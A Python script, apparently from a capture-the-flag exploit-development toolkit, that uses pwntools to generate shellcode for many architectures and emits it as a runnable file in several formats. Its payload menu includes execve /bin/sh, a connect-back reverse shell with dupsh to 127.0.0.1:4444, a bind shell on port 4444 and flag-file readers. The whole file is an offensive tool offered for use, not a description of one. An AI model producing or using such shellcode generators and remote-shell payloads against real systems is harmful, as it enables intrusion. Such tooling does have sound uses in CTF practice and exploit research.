#!/usr/bin/env python3
"""
Shellcode Generator using pwntools
Generates shellcode for various architectures and purposes
"""

import sys
import argparse
from pathlib import Path

def generate_shellcode(arch, shellcode_type, output=None):
    """Generate shellcode using pwntools"""
    
    try:
        from pwn import *
    except ImportError:
        print("❌ Error: pwntools not installed. Run 'pf install-pwntools' first.")
        sys.exit(1)
    
    # Set architecture
    context.arch = arch
    context.os = 'linux'
    
    shellcode_map = {
        'shell': lambda: shellcraft.sh(),
        'execve': lambda: shellcraft.execve('/bin/sh'),
        'exit': lambda: shellcraft.exit(0),
        'nop': lambda: shellcraft.nop(),
        'cat_flag': lambda: shellcraft.cat('flag.txt'),
        'connect_back': lambda: shellcraft.connect('127.0.0.1', 4444) + shellcraft.dupsh(),
        'bind_shell': lambda: shellcraft.bindsh(4444),
        'read_flag': lambda: shellcraft.open('flag.txt') + shellcraft.read('eax', 'esp', 100) + shellcraft.write(1, 'esp', 100),
    }
    
    if shellcode_type not in shellcode_map:
        print(f"❌ Error: Unknown shellcode type: {shellcode_type}")
        print(f"Available types: {', '.join(shellcode_map.keys())}")
        sys.exit(1)
    
    try:
        # Generate assembly
        asm_code = shellcode_map[shellcode_type]()
        
        # Assemble to bytecode
        bytecode = asm(asm_code)
        
        # Create output
        result = f'''#!/usr/bin/env python3
"""
{shellcode_type.title()} shellcode for {arch}
Generated by pf exploit development tools
"""

from pwn import *

# Set architecture
context.arch = '{arch}'

# Assembly code
asm_code = """
{asm_code}
"""

# Compiled bytecode
shellcode = {repr(bytecode)}

# Shellcode as hex string
shellcode_hex = "{bytecode.hex()}"

# Shellcode length
shellcode_len = {len(bytecode)}

def print_shellcode():
    """Print shellcode in various formats"""
    print(f"Shellcode type: {shellcode_type}")
    print(f"Architecture: {arch}")
    print(f"Length: {{shellcode_len}} bytes")
    print()
    
    print("Assembly:")
    print(asm_code)
    print()
    
    print("Bytecode (Python):")
    print(f"shellcode = {{repr(shellcode)}}")
    print()
    
    print("Hex string:")
    print(f'"{bytecode.hex()}"')
    print()
    
    print("C array:")
    hex_bytes = [f"0x{{b:02x}}" for b in shellcode]
    c_array = "unsigned char shellcode[] = {{\\n    " + ",\\n    ".join([", ".join(hex_bytes[i:i+8]) for i in range(0, len(hex_bytes), 8)]) + "\\n}};"
    print(c_array)
    print()
    
    print("Disassembly:")
    print(disasm(shellcode))

if __name__ == "__main__":
    print_shellcode()
'''
        
        if output:
            with open(output, 'w') as f:
                f.write(result)
            print(f"✅ Shellcode saved to: {output}")
        else:
            print(result)
            
    except Exception as e:
        print(f"❌ Error generating shellcode: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='Generate shellcode using pwntools')
    parser.add_argument('arch', help='Target architecture (amd64, i386, arm, etc.)')
    parser.add_argument('type', help='Shellcode type (shell, execve, exit, nop, cat_flag, connect_back, bind_shell, read_flag)')
    parser.add_argument('--output', help='Output file path')
    
    args = parser.parse_args()
    
    # Validate architecture
    valid_archs = ['amd64', 'i386', 'arm', 'aarch64', 'mips', 'mips64', 'powerpc', 'powerpc64', 'sparc', 'sparc64']
    if args.arch not in valid_archs:
        print(f"⚠️  Warning: Architecture '{args.arch}' may not be supported")
        print(f"Supported architectures: {', '.join(valid_archs)}")
    
    generate_shellcode(args.arch, args.type, args.output)

if __name__ == "__main__":
    main()